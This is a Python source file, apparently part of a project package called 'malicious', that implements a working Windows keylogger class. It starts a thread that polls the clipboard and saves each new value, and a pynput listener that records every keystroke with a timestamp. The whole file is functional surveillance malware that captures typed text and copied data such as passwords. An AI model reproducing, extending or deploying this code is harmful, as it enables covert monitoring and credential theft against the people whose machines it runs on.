"""
Edan Jacobson
Keylogger that logs clipboard and keyboard
"""
from datetime import datetime

import win32clipboard
from pynput import keyboard

import time

import threading

from malicious.maliciousConstants import SLEEP, BACKSPACE, NEW_LINE, TAB, SPACE, REMOVE_FIRST


class Keylogger:

    def __init__(self):
        """
        Method that creates keylogger object
        """
        date_time = time.ctime(time.time())
        self.logged_data = [f'[START OF KEY LOGS]\n  *~ Date/Time: {date_time}\n']
        self.copied_data = [f'[START OF CLIPBOARD LOGS]\n  *~ Date/Time: {date_time}\n']
        # Start a thread to track the clipboard
        self.clip_thread = threading.Thread(target=self.clipboard_tracker)
        self.clip_thread.start()
        # Start a thread to track the keyboard
        self.key_thread = keyboard.Listener(on_press=self.keyboard_tracker)
        self.key_thread.start()

    def clipboard_tracker(self):
        """
        Method that tracks all changes and values stored in
        clipboard and adds it to a file that stores all clipboard values
        """
        # Initialize the clipboard text
        txt = ""
        while True:
            # Open the clipboard
            win32clipboard.OpenClipboard()
            # Get the copied data from the clipboard
            copied = win32clipboard.GetClipboardData()
            # Close the clipboard
            win32clipboard.CloseClipboard()
            # If the copied data is different from the previous clipboard text
            if copied != txt:
                self.copied_data.append(copied)
                txt = copied
            # Wait for 0.5 seconds
            time.sleep(SLEEP)

    def keyboard_tracker(self, key):
        """
        Method that tracks and stores in file the
        keys/the text from keyboard
        """
        # Fix issue if control is pressed

        # If the backspace key is pressed
        if key == keyboard.Key.backspace:
            self.logged_data.append(BACKSPACE)
        # If any other key is pressed
        else:

            if key == keyboard.Key.enter:
                # If the enter key is pressed, write a newline character
                self.logged_data.append(NEW_LINE)
            elif key == keyboard.Key.tab:
                # If the tab key is pressed, write a tab character
                self.logged_data.append(TAB)
            elif key == keyboard.Key.space:
                # If the space key is pressed, write a space character
                self.logged_data.append(SPACE)
            elif key == keyboard.Key.shift:
                # If the shift key is pressed, do nothing
                pass
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                # If the control key is pressed, do nothing
                pass
            elif key == keyboard.Key.esc:
                # If the escape key is pressed, return
                return
            else:
                # Write the key to the file, removing the single quotes
                self.logged_data.append(str(key).strip("'"))

    def remove_copied(self):
        """
        Method that removes data from copied data
        :return:
        """
        self.copied_data = self.copied_data[REMOVE_FIRST:]

    def remove_logged(self):
        """
        Method that removes data from logged data
        :return:
        """
        self.logged_data = self.logged_data[REMOVE_FIRST:]
